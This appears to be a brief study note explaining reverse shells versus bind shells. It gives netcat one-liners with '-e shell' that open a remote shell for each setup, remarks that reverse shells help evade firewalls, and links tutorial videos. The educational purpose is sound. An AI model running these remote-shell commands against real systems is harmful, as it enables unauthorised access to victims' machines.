## Reverse shell & Bind shell
[Back to Cyber security page](../index.md)
- --
## Reverse shell
In reverse shell , attacker listens on port and victim connects to it with execution shell. It is preffered as it can be tunneled to avoid firewall.
``` bash
attacker > nc -lvnp $port 
 
victim > nc $ip $port -e shell
```
- --
## Bind Shell
In Bind shell , attacker connects to victims open port on which it is listening. Although this is easiest form of shell connection , it is protected by firewall so its not the prefered one.

Example : 
``` bash
attacker > nc $ip $port

victim > nc -lvnp $port -e shell
```
- --
![difference|700](https://2.bp.blogspot.com/-ki2E1zoOUqE/Wu2h9kCjsSI/AAAAAAAAB9I/gykQPAMpT5M0NU9YtHAQllyvyJyIzHVIACLcBGAs/s1600/Bind%2Bshell%2Band%2Breverse%2Bshell.png)
- --
### Source 
- [Youtube video Hindi](https://youtu.be/BQfryZGl6nQ)
- [Youtube video hindi](https://youtu.be/PMd4mmRuua0)
- [HackerSploit video](https://youtu.be/1kHXf51Sqpk)